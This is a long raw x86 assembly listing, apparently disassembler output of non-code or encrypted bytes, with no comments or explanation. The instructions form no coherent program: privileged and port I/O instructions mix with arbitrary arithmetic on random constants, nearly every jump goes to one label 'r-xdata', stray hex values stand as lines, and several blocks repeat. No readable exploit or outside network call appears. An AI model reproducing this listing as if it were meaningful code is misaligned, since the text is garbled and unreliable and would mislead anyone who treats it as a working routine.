cli
lea esi [ 0xffffffffcd3a5b7f ]
sub eax 0xe15b7f35
or [ gs : ebx + 0x5b7f1184 ] 0xf9
cmp al 0xdb
jle r-xdata
scasb [ edi ]
loope r-xdata
inc ecx
jle r-xdata
pop ebx
stc
mov ecx 0x505f32be
push cs
imul ebx [ ebx - 0x47 ] 0xb622976f
xor eax 0x953cd27f
jg r-xdata
add [ ecx - 0x6a ] edx
jno r-xdata
mov ecx 0xd35b1565
xor eax 0x35d35b15
xchg edi eax
mov ah 0xa8
xor eax 0x31f4d07f
xchg esi eax
mov esi 0x17f35ac
push ecx
shl [ ecx + 0x5b ] cl
jo r-xdata
cld
movsd [ edi ] [ esi ]
xor eax 0x3651017f
jo r-xdata
pop ebx
mov ecx 0xb9cfeaca
xor eax 0x45f4d07f
xchg esi eax
mov ecx 0xb95f7f5d
xor eax 0x3519ce80
jg r-xdata
shl ah 0x1
mov ecx 0x326b3abc
js r-xdata
jg r-xdata
mov dl 0x5c
and [ edi + 0x5b ] bh
jecxz r-xdata
cmp ah [ ebx ]
push eax
shl ah 0x1
xor [ esi + 0x7f35ac94 ] edx
mov bl 0xd
cmp edi [ edi + 0x5b ]
xor [ eax + 0x53 ] dh
scasb [ edi ]
shl [ 0x3519ce80 ] cl
jg r-xdata
mov ecx 0xd3533abc
xor [ edi ] edx
pop ebx
test eax 0xb9337f35
mov ch 0x7f
pop ebx
shl [ 0x6046a415 ] cl
jg r-xdata
mov dl 0x45
and [ edi + 0x5b ] edi
jecxz r-xdata
in eax 0x6b
pop ebx
mov ecx 0xad83966c
xor eax 0x7e51017f
jno r-xdata
push 0x71
pop ebx
push ecx
pop ebx
shl [ 0x35a8b497 ] cl
jg r-xdata
test eax 0xf635b955
push ds
popfd
mov esi 0x37505f32
imul ebx [ ebx - 0x47 ] 0xb79e976f
pop ebx
xor [ esi + 0x7f35ac54 ] edx
add [ ecx + 0xe ] edx
mov ecx 0xf4d0b8bc
pop ebx
test [ 0x3ab95b7b ] dh
std
out 0xb8 eax
xor eax 0x22e6b27f
jg r-xdata
jg r-xdata
jg r-xdata
jno r-xdata
push esp
lodsb [ esi ]
xor eax 0xe51017f
mov ecx 0x460b2b35
loop r-xdata
in eax dx
push ebp
mov ecx 0x8d1ef635
mov esi 0x5c505f32
cdq
inc eax
fwait
fadd [ esi + 0x31 ]
add [ eax - 0x2f ] edx
jne r-xdata
hlt
js r-xdata
fwait
dec ebp
mov ecx 0x5db32535
cmp [ edi + 0x5b ] bh
mov dh ch
test dh 0x25
xor eax 0x1e525b7f
shl ah 0x1
xor [ esi + 0x7f35acbe ] edx
add [ ecx - 0x2e ] edx
jno r-xdata
loopne r-xdata
jle r-xdata
push ecx
push ecx
les ebx [ edi + edx ]
jmp ebp
in eax 0xb5
xor al 0x7f
pop ebx
leave
cmp edi [ edi + 0x5b ]
xor [ eax + 0x33 ] dh
shl ah 0x1
xor [ esi + 0x7f35af5f ] edx
add [ ecx + 0x6a ] edx
jno r-xdata
cmp eax 0x35be5b7f
daa
mov dl 0x4a
and [ edi + 0x5b ] bh
cld
push 0x5b
mov ecx 0xb7da976f
xor eax 0x55fcd27f
hlt
pop edi
push eax
pop esp
mov ecx 0x327b3abc
js r-xdata
jg r-xdata
xor ch [ ebx ]
push eax
push esp
push 0x976fb95b
sbb dh [ esi + 0x4f6a7f35 ]
add al 0x80
or edx ebx
cmp al [ eax + 0x7f352dce ]
and al 0xd2
push eax
mov ah 0xbe
push edx
push ds
pop ebx
mov ch 0x34
jg r-xdata
sub al 0xa1
jg r-xdata
ja r-xdata
test [ esi - 0x47 ] ecx
xor eax 0x3841b325
jg r-xdata
loopne r-xdata
pop ebx
mov ecx 0x50233abc
pop ebx
loope r-xdata
jpe r-xdata
cmp cl ch
xor eax 0x1dfcd27f
hlt
pop ebx
mov ecx 0xb79e976f
or [ ebx + 0x5b7f1184 ] 0xf9
pop ebx
mov ecx 0xfc9c7840
aam 0xfc
jno r-xdata
mov ecx 0x2ca47cf8
test eax 0xddb95b7f
scasd [ edi ]
movsb [ edi ] [ esi ]
pop ebx
jpo r-xdata
loopne r-xdata
xor [ eax + 0x2f ] dh
mov dl 0x67
and edi [ edi + 0x5b ]
or edi [ edx + 0x35 ]
jg r-xdata
sbb al 0x17
shr [ edi + 0x30037f35 ] 0x1
jg r-xdata
daa
mov dl 0xb1
and edi [ edi + 0x5b ]
mov dl 0x15
and bh [ edi + 0x5b ]
loope r-xdata
sub al 0xa9
jg r-xdata
mov ecx 0xd3537f35
jne r-xdata
jg r-xdata
int1
dec esp
mov ecx 0xcca42635
or eax 0x6466b80
sar ah 0x1
cmp [ edx - 0x67 ] edi
jg r-xdata
cmp al [ edi + 0x39 ]
or eax 0x6d3d547e
jne r-xdata
jo r-xdata
add esi [ eax ]
0x17f4
mov ecx 0x46a4afdd
xchg esi eax
pushfd
scasd [ edi ]
xor eax 0xdfcd47f
xchg esi eax
shr [ edi - 0x32b80cb ] 0x9
xchg esi eax
scasb [ edi ]
stosd [ edi ]
xor eax 0x75fcd47f
xchg esi eax
pop ebx
mov [ 0x35d30c7f ] esi
adc eax 0x776046a4
fcom [ esi + 0x31 ]
cld
mov ecx 0xf4d02435
cld
sub esp edi
arpl [ eax - 0x154c8ec0 ] di
and al 0x7f
pop ebx
cmp cl ch
jle r-xdata
shl al 0x1
adc [ esi ] ebp
mov ecx 0xbc573abe
idiv [ esi ]
pop ebx
mov ecx 0x7f167ff3
jne r-xdata
cmp [ esi + 0x7f35af9c ] edx
aam 0xfc
or eax 0x35afc196
jg r-xdata
mov ecx 0xfcd29641
shl [ 0x6046a415 ] cl
ja r-xdata
loop r-xdata
pop ebx
cmp esp esi
dec ebx
xor [ ebx + edi * 2 - 0x69ca46b9 ] ah
out 0x9e eax
xor eax 0x4046027f
inc edi
movsb [ edi ] [ esi ]
mov cl dl
dec edi
or dh [ edx ]
jo r-xdata
mov ecx 0x3a433abe
or eax 0xdcf12f7f
add eax 0x2435b94d
cld
or [ esi + 0x7f35abae ] edx
aam 0xfc
jne r-xdata
xor eax 0x1f35b958
pop esi
jpo r-xdata
jg r-xdata
mov ecx 0x34d01f35
xchg ecx eax
cmp al 0x4b
ja r-xdata
shl [ esi ] 0x1
int1
fdivr [ esi - 0x34cfa8fe ]
div [ ebx + 0x5f ]
add [ eax + 0x3 ] edx
push 0xf46db95b
inc esi
mov [ 0xffffffffd29641b9 ] eax
cld
push esi
xor esp edi
test eax 0xb6b95b7f
xchg [ ecx - 0x3c ] edx
pop edi
stosb [ edi ]
xor eax 0x71fcd47f
xchg esi eax
mov ecx 0xd358f635
jne r-xdata
mov al [ 0x5f73f638 ]
mov ecx 0xb949b2dc
xor eax 0x3935b325
jg r-xdata
shl [ ecx + edx * 4 ] 0x1
pop ds
jg r-xdata
dec ecx
mov ecx 0x35b32535
cmp [ edi + 0x5b ] edi
mov ecx 0xb94d7bdc
xor eax 0x23b1b227
jg r-xdata
pop ebx
mov ecx 0xbe9fe0bc
xor eax 0x65e6d07f
test ah 0x71
xor bh [ edi + 0x5b ]
xor ch [ edx + 0x2b ]
shl [ esi ] cl
stc
js r-xdata
pop ebx
xor [ eax + 0x27 ] dh
mov ch 0x62
xchg edi eax
push eax
mov ch 0x35
jg r-xdata
inc edi
pop edx
mov dh 0xb1
jmp 0xffffffffba452120
pop ebx
mov ecx 0x305bf46d
jo r-xdata
jmp 0xffffffffb998fcbb
pop ebx
mov ecx 0xb14fc0b6
xor eax 0xb1b65b7f
ror edx cl
int 0x7f
das
dec ebx
pop edi
aas
xor edi [ ecx + 0x465b7f05 ]
xor [ edi + 0x53 ] 0xb9
xor eax 0x3db9ec80
jg r-xdata
pop ebx
mov ecx 0x3a6f2aca
mov ecx 0x321b90b6
mov dl 0xbf
pop ebx
mov ecx 0xaddcf635
cmp eax 0xb2325b7f
jg r-xdata
add [ 0xfffffffff7b95b7f ] esi
ja r-xdata
dec [ ecx ]
hlt
jg r-xdata
mov dl 0x46
and edi [ edi + 0x5b ]
loope r-xdata
dec edi
push ecx
xor dh [ edx + 0x35b95773 ]
cld
mov [ 0xffffffffc3fb3ab9 ] eax
mov ecx 0x3e587f35
xor eax 0xbcb95b77
cmp cl [ ebx + 0x32 ]
mov dl 0x7f
push edi
mov ecx 0xcc9bfa35
xor esi esp
ja r-xdata
mov ecx 0xa1dcf635
cmp eax 0x6a325b7f
inc ebx
fidivr [ edx - 0x33 ]
jg r-xdata
jpe r-xdata
sbb eax 0xe35b7f27
fld [ 0xffffffff9435b957 ]
dec eax
jecxz r-xdata
aas
sbb [ 0xffffffffbeb95b7f ] al
aas
push edi
xor dh [ ebp + 0x73 ]
mov ecx 0xb54be0be
xor eax 0x3526587f
ja r-xdata
mov ecx 0xefa87e6b
mov esp 0xf33a057c
jpo r-xdata
xor eax 0x34b95b77
test al 0xb3
xor eax 0x25fc9c7f
jg r-xdata
or [ esi ] 0xb1
mov dh 0x87
mov ecx 0xb9ec8035
cmp eax 0xcad35b7f
pop ebx
int 0xd6
mul [ ebp + 0x4b7ff338 ]
mov ecx 0xe8924e35
0x4b09
mov ecx 0x7fd8256e
sbb eax 0x779198fc
sub eax 0x77312e62
pop ebx
mov ecx 0xea4a040
xor eax 0xcab95b77
sub ch [ edi + 0x3a ]
mov ecx 0xb14be0bc
xor eax 0xb447d27f
mov ecx 0x7f35a95b
push 0x6b
sub al 0x31
xchg ecx eax
mov esi 0xedb8573a
das
or eax 0x5b744051
shl ah 0x1
fadd [ 0x2435b94d ]
clc
xor eax 0x5b510b7f
ja r-xdata
out 0x1d al
test ah 0xa9
cmp eax 0xbedf5b7f
and [ ebp - 0x21 ] bl
mov esp 0x35be9fe0
jg r-xdata
sub al 0x9
fnstsw [ esi + 0x35b94372 ]
jg r-xdata
add al [ ebx ]
mov eax 0xb207fb3a
xor eax 0x5183f7f
jg r-xdata
mov ecx 0x305b7f35
jge r-xdata
shl [ esi ] 0x1
cmp eax 0xdeb95b77
jpe r-xdata
mov ecx 0xefa87e6b
mov esp 0xbe9bb07c
ficomp [ bp + si - 0x36 ]
sbb [ ebx - 0x47 ] 0xbc
and cl [ edi + 0x51 ]
mov esi [ ebp + 0x5b ]
mov ecx 0xb54be0be
xor eax 0x3526587f
ja r-xdata
xlat
jne r-xdata
push edx
adc dh ah
inc ebx
mov edx 0xb9537faa
xor eax 0xbcbb98fc
and cl [ edi + 0x51 ]
sub ch [ ebx + 0x26 ]
fdivr [ eax + 0x21 ]
xchg esi eax
insb
inc esi
0xb380
fsubr [ ecx + 0x305b7f39 ]
mov dl 0x7f
push edi
mov ecx 0xefad4e35
mov esi 0x35b55bf8
mov ecx 0xad1eb835
xor eax 0xb6b95b7f
ror [ edi - 0x4f ] 0x35
jg r-xdata
mov ch 0x34
mov esp 0x17757ed8
mov [ 0x87f35b9 ] eax
out dx al
fisttp [ ebx - 0xbca46b0 ]
add al 0x8d
mov esp 0x35be9be0
jg r-xdata
js r-xdata
int1
xor al 0x91
movsb [ edi ] [ esi ]
imul ebx esi 0xca51b36a
and [ esi + eax * 2 + 0x465f5b41 ] 0x61
pop ebx
push edi
[ esi ] ebp
fdivr [ edi + 0x1d ]
mov ecx 0x32573fbe
jne r-xdata
jg r-xdata
ror [ esi ] 0x1
xor eax 0xbcb95b77
cmovae edi [ edx - 0x46acd07e ]
xor eax 0xb6a52bf6
add al [ ebx ]
mov eax 0x47d22b41
mov ah 0xb9
pop ebx
test eax 0x706a7f35
mul [ fs : ebx + 0x5b7335bc ]
mov ecx 0xb21a9765
xor eax 0x4346087f
add edi [ eax + 0x47d22b41 ]
jg r-xdata
pop ebx
mov ch 0x35
mov dh 0x5b
mov ecx 0xed02e35
and [ edi + 0x5b ] esi
mov ecx 0xb15bf8be
xor eax 0x34495a7f
mov bh 0x31
lodsd [ esi ]
mul [ gs : eax + 0x577ff638 ]
mov ecx 0xfb32c35
aas
jg r-xdata
mov dh 0xb1
ja r-xdata
ja r-xdata
inc esi
inc ebx
xor eax 0x65b95b77
adc eax 0x1f6046a4
mov ecx 0xba430fbc
sub [ edi ] 0x53
mov ecx 0xa52bf635
mov dh 0x2
pushad
xor [ ss : edi + 0x5b ] esi
mov ecx 0x41d2ad40
xor [ edi + 0x57 ] bh
mov ecx 0xbb312f35
0x57c8
xor eax 0x36b95b77
cmp [ edi - 0x17 ] edx
pop edi
and [ esp + ebp * 8 + 0x7fd82655 ] 0x1d
shl bh 0x1
add esi esi
adc al 0xbd
mov esi 0xba300b31
adc ebx [ edx - 0x47 ]
xor eax 0xbcb526f4
xchg al bl
js r-xdata
shr [ esi ] 0x1
ja r-xdata
mov ecx 0x46a41565
pushad
pop ds
pop edx
mov ecx 0xb526f435
mov esp 0x7d78d886
mov ecx 0xb15be836
xor eax 0x38323f7f
mov [ 0x16fa3ab8 ] eax
not [ esi * 4 + 0x301fbeb6 ]
jpe r-xdata
inc esi
0xd080
cli
fdivr [ eax + 0x25 ]
not [ ecx + ebp * 4 ]
pop ebx
mov ecx 0xbd1af435
mov esp 0x6530af2f
mov [ 0xffffffff94b67ad2 ] eax
xor [ si ] ch
cld
cwde
test [ esi - 0x16cfd06c ] esi
cld
cwde
mov cl 0xbc
mov [ 0xfffffffff40578d8 ] al
inc edx
mov ah bh
dec esi
lodsd [ esi ]
mov dl cl
cmp [ ecx - 0x2d8cb7ce ] 0x41
xor [ ebp - 0x9ca46e6 ] bh
push ds
in eax dx
mov esi 0x44320f32
inc ebx
pop edx
ja r-xdata
dec eax
mov ah 0xbe
mov edi [ ecx - 0x92d80cb ]
jno r-xdata
adc al 0xa9
push ss
mov ebp 0xb94b1bdc
xor eax 0x3cb9b325
jg r-xdata
push ss
inc esi
in eax 0xf6
push ds
rcr ebp 0x1
adc eax 0xf635b953
push ds
aad 0xbc
xchg [ esi + 0x45 ] ebx
cmp bh [ edi + 0x5b ]
xor bh [ eax + 0x27 ]
shl [ ecx - 0x32a4794a ] cl
cmp esi esp
push ds
in eax dx
mov esi 0xedb86727
sbb [ ecx + edi * 8 + 0x325b7f21 ] ebx
js r-xdata
enter 0xb837 0x35
jg r-xdata
mov dl 0x86
and eax 0xdde35b7f
mov ecx 0x8035b953
sub al 0xb1
0x5708
inc esi
in eax 0xfc
into
xor esp esi
adc al 0xb1
0xa44e
sub_4533a0
push ss
leave
fsubr [ ebp + 0x2535b954 ]
mov bl 0x85
xor bh [ edi + 0x5b ]
inc esi
inc edx
outsd
shr dh 0x1
xor eax 0xf43e3073
jns r-xdata
push 0x77
jg r-xdata
cmp eax 0xcabd2980
scasd [ edi ]
fadd [ ecx + 0x35 ]
jo r-xdata
out dx al
jg r-xdata
pop edi
inc esi
in eax 0xfc
cmp cl [ edx + 0x35b95483 ]
jg r-xdata
pop ebx
mov ecx 0x4462fa3a
0xd880
mov [ 0x2fa3ab9 ] eax
mov ebx 0xf4d07f35
xor [ esi + 0x7f35b71b ] edx
add [ ecx - 0x7a ] edx
jns r-xdata
mov ecx 0xb95b7e35
xor eax 0xdcc916f4
std
push esp
mov ecx 0x6db32535
xor edi [ edi + 0x5b ]
shl [ 0xffffffffcab10cf4 ] cl
or eax 0xfce5465f
pop ebx
mov ecx 0xb8d7f8bc
xor eax 0xb440d27f
mov esi 0x7f35bea7
or dh [ edx ]
bound esi [ edi - 0x5c ]
mov ecx edx
scasd [ edi ]
fiadd [ esi ]
leave
js r-xdata
movsb [ edi ] [ esi ]
mov cl dl
sub bh [ ebx ]
jle r-xdata
test [ esi - 0x27afa0ce ] bh
jo r-xdata
fistp [ eax + 0x46337f35 ]
0x5b7f
mov ecx 0xb95b7e36
cmp bh dl
bound eax [ edx + ecx * 8 - 0x80 ]
fadd [ esi ]
leave
jo r-xdata
sbb esi [ edi + 0x51017f35 ]
xchg [ ecx + 0x5b ] bh
mov ecx 0xbe4a976f
xor eax 0x3de6d07f
cld
cwde
mov cl 0xca
dec esp
movsb [ edi ] [ esi ]
imul edi [ esp + eax * 4 + 0x7e417ada ] 0x1566b95b
pop edx
shl [ 0xffffffffcab95b6f ] 0x1
or [ edi + 0x32 ] bl
or eax [ esi - 0x5e ]
pop es
pop edx
mov ecx 0x29e4fc35
mov ecx 0xb6df7035
aaa
jg r-xdata
pop ebx
cmp [ ecx + 0x1d ] eax
scasb [ edi ]
xor eax 0x6ecd9b7f
inc edx
mov ecx 0xb95b8208
cmc
xor al 0x7f
pop ebx
mov eax 0xb9cffa3a
xor eax 0xa93ed07f
jle r-xdata
in al 0x29
xor bh [ eax + 0x7b ]
int3
cmp [ ecx + 0x7 ] eax
or al 0x35
jg r-xdata
pop ebx
or eax 0xf635b95d
fadd st1
xor al 0x7f
pop ebx
xor bh [ eax + 0x7b ]
mov dl 0x89
cmp edi [ edi + 0x5b ]
jecxz r-xdata
pop ebx
mov ecx 0xbedf7030
xor al 0x7f
pop ebx
shl [ eax + eax * 4 ] cl
push ss
div [ esi - 0x61 ]
das
in eax dx
or [ eax + ebp ] bl
aam 0xd5
or edx [ esi ]
test [ esi ] dh
jg r-xdata
test bl ch
test [ esi - 0xe04c549 ] esi
fbstp [ esi + 0x325b7f37 ]
js r-xdata
and [ ebp - 0x47 ] ebx
xor eax 0x34c5dcf6
jg r-xdata
jg r-xdata
mov ecx 0xb8c3c8ca
xor eax 0xa10ea47f
jle r-xdata
mov sp 0x7f35
fwait
mov dh 0xb1
stc
pop ebx
mov ecx 0xb95a4235
xor eax 0xdedf2fff
dec ebp
fadd [ esi ]
mov ecx 0xbfe14235
xor eax 0xa13d547f
jg r-xdata
mov ecx 0x36667f35
xor eax 0xb1b69b7f
sti
int1
mov dl 0x94
cmp edi [ edi + 0x5b ]
jecxz r-xdata
loopne r-xdata
xor ax 0x9b7f
mov dh 0xb1
xor dh [ edx + 0x7b ]
pop esi
mov ecx 0x305b7f25
mov dl 0xff
pop edx
mov ecx 0xd5dcf435
xor al 0x7f
pop ebx
xchg esp eax
xor eax 0xbcb95b6f
clc
xor edi [ ebx + 0x465b7e35 ]
and bh 0x5a
mov ecx 0x2dec8035
xor al 0x7f
pop ebx
inc esi
mov [ 0x35b95a03 ] al
hlt
inc esi
mov [ 0x35b95a03 ] al
xchg esp eax
hlt
pop edx
mov ecx 0xa9a3fc35
inc ecx
aad 0xd8
inc ecx
xor eax 0xce30fe0b
mov ecx 0xb827e8ca
xor eax 0xcaa2b27f
and [ edx + edi * 2 - 0x47a481a3 ] 0xb5
sub ah 0x21
xor al 0x7f
pop ebx
inc esi
sub bl 0x5a
mov ecx 0xc5cc8035
xor al 0x7f
pop ebx
push edx
aam 0x17
pop edi
mov ecx 0xea43f34
lodsd [ esi ]
jle r-xdata
movsd [ edi ] [ esi ]
jle r-xdata
pop edx
mov ecx 0xdf2fff35
fimul [ ebp - 0x28 ]
push es
mov ecx 0xb95dba08
xor eax 0x3530df70
jg r-xdata
inc edi
xor dh cl
mov ecx 0xb8cfc8ca
xor eax 0x492ea47f
jle r-xdata
pop ebx
test [ eax ] ch
jg r-xdata
movsb [ edi ] [ esi ]
push cs
mov cl 0x7e
pop ebx
mov ecx 0xb8dbc8ca
xor eax 0x3de6d07f
sub [ eax + 0x46 ] 0x60
pop ds
mov ecx 0xbb33b7de
xor eax 0x82465b7e
out 0x5a eax
mov ecx 0x2dec8035
xor al 0x7f
pop ebx
into
sub eax 0xd15b7f35
aaa
jg r-xdata
fistp [ esi - 0x2ca480cc ]
xor al 0x80
jns r-xdata
sti
and eax 0x667f35b9
cli
xor eax 0x42cd9b7d
inc edx
jle r-xdata
jo r-xdata
xor eax 0x8c92fbf
jmp 0xc3aee87
sub_4537cb
mov esp 0x7f2aadd1
mov esi [ ebx ]
cmp [ eax - 0x2d ] edi
mov ch 0x2a
test [ edi - 0x42 ] 0xb5d1ae35
cmp cl [ edi + 0x55 ]
dec edx
xor edi [ edi - 0x4b ]
inc eax
popfd
rol ah 0x1
cmp esi edi
pushfd
jpo r-xdata
jg r-xdata
jg r-xdata
mov eax [ 0x7f35b5 ]
xor [ eax + 0x17 ] ch
jg r-xdata
push ds
mov ch 0x30
jg r-xdata
test [ esi + esi * 4 ] 0xe2
mov eax 0x7f5b7f34
xor [ eax + 0x5b ] esi
jmp [ eax - 0x47 ]
pushad
mov ecx 0x49b38b40
xor al 0x7f
pop ebx
std
fisttp [ eax + 0x59 ]
mov ecx 0xb506f435
mov ah 0xbc
pop ebx
test eax 0x38087f35
idiv [ edi + 0x56 ]
mov ecx 0xfab32c35
xor [ edi + 0x5b ] bh
xor ah dh
hlt
jo r-xdata
pop ebx
mov ecx 0x4c0d9635
0xb280
shr [ edx - 0x5ac9443 ] 0x1
je r-xdata
mov ecx 0xb5a19635
xor eax 0x6830007f
pop ss
pop ebp
mov ecx 0xb863ff6d
inc eax
je r-xdata
add [ eax ] dh
push 0xbdaad117
imul edx [ ebx - 0x6 ] 0x74
pop eax
iretd
mov ecx 0xb9337e5f
xor eax 0xcae8db7f
sub bh [ ebx + 0x30 ]
pop ebx
mov dl 0x1d
xor edi [ edi + 0x5b ]
loope r-xdata
jns r-xdata
mov eax 0x65b27740
xor edi [ edi + 0x5b ]
pop ebp
jmp r-xdata
sub [ ebp - 0x47 ] ebx
xor eax 0xb4b506f4
mov esp 0x7f35a95b
pop edx
ja r-xdata
mov dh 0xd
jmp 0xffffffffb9a262b3
pop ebx
fdivr [ ecx + 0x37 ]
cmp ebx ebx
xchg [ 0xffffffffc550b40a ] esi
shr [ ecx + 0x636361bf ] 0x1
inc eax
jle r-xdata
rdpmc
jg r-xdata
jns r-xdata
hlt
cmp eax 0x7e35b95d
xchg ebp eax
jg r-xdata
mov dh 0xd
0xb95d3ddd 0x7e35
inc esi
mov al [ 0x35b95beb ]
xchg esi eax
or eax 0xb280ca4c
loope r-xdata
popad
mov ecx 0x7f957e35
xor ebx [ ebp + 0x1d ]
push ecx
jpo r-xdata
sbb eax 0xe15b7f33
add al 0xb6
or eax 0x5d29dde9
mov ecx 0xb506f435
mov ah 0xbc
pop ebx
jae r-xdata
mov ecx 0xcc5a87b6
sbb edi [ ecx - 0x468c66a3 ]
pop ebp
xchg esi eax
jae r-xdata
pop ebp
sbb eax 0x5b797b51
xor al [ eax + 0x73 ]
fidivr [ edi + 0x35 ]
mov esi [ ebx + 0x5b7f3449 ]
cmp cl [ edi + 0x32 ]
inc eax
jae r-xdata
test eax 0x775a7f35
add al 0xb6
or eax 0x5d3dddea
pop ebp
hlt
jae r-xdata
jg r-xdata
arpl [ ebx + 0x40 ] sp
insd
pop ebx
mov ecx 0xb95df6dd
xor eax 0x40b8a3fc
ja r-xdata
outsd
pop ebx
mov ecx 0xa9d1ad04
mov edi 0x40636361
loope r-xdata
xor edi [ gs : edi + 0x5b ]
sub_453b38
push edi
out dx eax
mov eax 0x4e2bc0a
movsb [ edi ] [ esi ]
or dl ch
sub si [ ebx ]
mov ecx 0xeb5b7b35
sub edx edx
cmp al 0xf5
jg r-xdata
fiadd [ ebx + 0x51 ]
mov ecx 0x7dd8afca
sub [ edx + ebp * 2 + 0xb2f6579 ] edi
in eax dx
pop ebp
jg r-xdata
popfd
std
r-xdata
mov ebp 0xad2e8035
0x4b0a
cwde
xchg ebp eax
jg r-xdata
mov esp 0xb67ad27c
mov edi 0xfc36305f
mov bl 0xbd
mov esi 0x35b153f0
jg r-xdata
mov ecx 0x30140b35
int 0x7a
cdq
test [ 0x28323f7f ] esi
push eax
and eax 0x3db9c4f4
jg r-xdata
mov eax 0xf99c19ed
and [ edi + 0x5b ] edi
xor ch cl
jpe r-xdata
je r-xdata
sar ah cl
pop ebp
mul [ eax + 0x577ff638 ]
mov ecx 0xf9312c35
pop ebp
jg r-xdata
xor ah [ ecx ]
je r-xdata
fcmovb st7
adc [ edi ] edi
pop ebx
mov ecx 0x38600b77
dec ebx
pop ebx
movsd [ edi ] [ esi ]
xor eax 0x31d30b7f
jns r-xdata
sub [ esp + edi * 8 - 0x5e ] edi
mov ecx 0x5098a240
mov edi 0xbab95b7b
cmp al [ ebx - 0x23 ]
xchg esp eax
dec edi
pop ebx
mov ecx 0xb51bf435
and eax 0x5b7f559d
fld [ ecx + 0x10 ]
fcmovb st7
adc [ edi ] edi
pop ebx
mov ecx 0x38040bf5
dec ebx
pop ebx
fstp [ ecx - 0x10d040cb ]
mov ah 0x1
jg r-xdata
stosd [ edi ]
xor eax 0xca46312f
sub bh [ ebx ]
loope r-xdata
pop ebx
mov ecx 0x9598fc35
hlt
inc ebx
push ecx
jg r-xdata
xor eax 0x5cd3b4f
sbb edi [ ecx - 0x74d0d0cb ]
mov ah 0x1
jg r-xdata
pushad
cmp [ ebx + 0x5b ] cl
mov ecx 0x46a41535
pushad
cmp ebx edx
jae r-xdata
sub ah 0xb1
cmp eax 0x82465b7f
jg r-xdata
xor eax 0x78cd9b7f
mov ch 0xbe
aas
dec edi
xor dh [ 0xffffffff8c9103f4 ]
push 0xfc35b95b
mov [ 0xffffffffd16f41b9 ] al
lodsd [ esi ]
hlt
aaa
xor bh [ bx + di + 0x77 ]
pop ds
mov dl 0xca
rol [ eax + 0x5b4b38a4 ] 0x7b
mov ecx 0xd52f9f35
mov ah 0x1
jg r-xdata
inc esi
cmp [ edi + 0x53 ] 0xb9
xor eax 0x6046a415
das
xor eax 0x4dcd3b7f
mov esi 0x35324f3f
hlt
std
mov ecx 0xbcf6b15f
sar [ esi ] 0x1
xor eax 0xbeb95b77
daa
sub_453b6d
mov ecx 0x7dd87f35
sub [ eax + ebx * 8 + 0x5b772d06 ] edi
mov ecx 0x30140b35
int 0x7a
cdq
test [ 0x28323f7f ] esi
push eax
and eax 0x3db9c4f4
jg r-xdata
sar ah cl
pop ebp
mul [ eax + 0x577ff638 ]
mov ecx 0xf9312c35
pop ebp
jg r-xdata
xor ah [ ecx ]
je r-xdata
and eax 0x5b7f559d
fld [ ecx + 0x10 ]
fcmovb st7
adc [ edi ] edi
pop ebx
mov ecx 0x38040bf5
dec ebx
pop ebx
fstp [ ecx - 0x10d040cb ]
mov ah 0x1
jg r-xdata
stosd [ edi ]
xor eax 0xca46312f
sub bh [ ebx ]
loope r-xdata
pop ebx
mov ecx 0x9598fc35
mov esp 0xb67ad27c
mov edi 0xfc36305f
mov bl 0xbd
mov esi 0x35b153f0
jg r-xdata
inc ebx
push ecx
hlt
sub ah 0xb1
cmp eax 0x82465b7f
jg r-xdata
xor eax 0x78cd9b7f
mov ch 0xbe
aas
dec edi
xor dh [ 0xffffffff8c9103f4 ]
push 0xfc35b95b
mov [ 0xffffffffd16f41b9 ] al
lodsd [ esi ]
hlt
aaa
xor bh [ bx + di + 0x77 ]
jae r-xdata
pushad
cmp [ ebx + 0x5b ] cl
mov ecx 0x46a41535
pushad
mov esi 0x35324f3f
hlt
std
mov ecx 0xbcf6b15f
sar [ esi ] 0x1
xor eax 0xbeb95b77
daa
mov eax 0xf99c19ed
and [ edi + 0x5b ] edi
xor ch cl
jpe r-xdata
jg r-xdata
xor eax 0x5cd3b4f
das
xor eax 0x4dcd3b7f
sbb edi [ ecx - 0x74d0d0cb ]
mov ah 0x1
jg r-xdata
fcmovb st7
adc [ edi ] edi
pop ebx
mov ecx 0x38600b77
dec ebx
pop ebx
movsd [ edi ] [ esi ]
xor eax 0x31d30b7f
pop ds
mov dl 0xca
rol [ eax + 0x5b4b38a4 ] 0x7b
mov ecx 0xd52f9f35
mov ah 0x1
jg r-xdata
inc esi
cmp [ edi + 0x53 ] 0xb9
xor eax 0x6046a415
sub_453cd3
aas
pop ebx
mov ecx 0x24e9435
aaa
jg r-xdata
ror ah 0x1
cmp esi edi
popfd
mov ecx 0xd35b7f28
xor eax 0x34d35b15
adc eax 0x1737d35b
pop ebx
mov ecx 0x460d3f35
pushad
pop edi
sar [ esi - 0x42 ] cl
or dl [ edi + 0x38 ]
jg r-xdata
mov ecx 0xbde071de
xor eax 0x32525b7f
les edi [ ebx - 0x47 ]
xor eax 0xf6b9b07f
hlt
pop edi
xor esi [ esi ]
inc ebx
mov dl 0xcc
add [ esi - 0x6e ] cl
clc
mov edi 0x8d85507b
or ah [ ebx + 0x506bbef8 ]
mov esi 0x67bd7f3b
mul [ eax + 0x5a0bf638 ]
mov ecx 0xf9312c35
pop ebp
jg r-xdata
mov ecx 0xef5b1535
0x5f09
cwde
mov ch 0x66
adc eax 0x7bde3a1b
or [ edx ] bh
fidivr [ ebx + 0x8 ]
ror edx cl
or [ ebx + 0x547fcd3a ] 0x3c
mov [ 0xffffffffbeb95b7f ] al
and edi [ edi - 0x43 ]
mov esi 0x36bd7f3b
cmp edi [ edi - 0x4f ]
jbe r-xdata
mov ecx 0x46312f35
0x3b2a
dec esi
xchg edx eax
cli
mov ch 0x44
cdq
int3
cwde
mov dh 0xb1
std
pop ebx
mov ecx 0x160ff35
inc eax
sub_453d65
cmp bl dh
mov ebp 0x2935b97e
or al 0x46
pushad
pop ebx
or al 0x46
pushad
push edi
ror ah 0x1
cmp esi edi
popfd
mov ecx 0xd35b7f28
xor al 0x15
pop ebx
shl [ 0x5fb93129 ] cl
jg r-xdata
stosb [ edi ]
mov ebp 0x74fa536b
jmp [ eax - 0x47 ]
in al dx
mov esp 0x7711fdd0
shl ch 0x1
adc [ ebx + 0x33 ] edi
inc esi
xor eax 0x66e95b7f
or [ esi ] 0xf5
div [ edi + 0x5b ]
xor ch [ ecx + 0x5b ]
pop edi
xor esi [ esi ]
inc ebx
mov dl 0xcc
add [ esi - 0x6e ] cl
clc
mov edi 0x8d85507b
or ah [ ebx + 0x506bbef8 ]
mov esi 0x67bd7f3b
mul [ eax + 0x5a0bf638 ]
mov ecx 0xf9312c35
pop ebp
jg r-xdata
cwde
mov ch 0x66
adc eax 0x7bde3a1b
or [ edx ] bh
fidivr [ ebx + 0x8 ]
ror edx cl
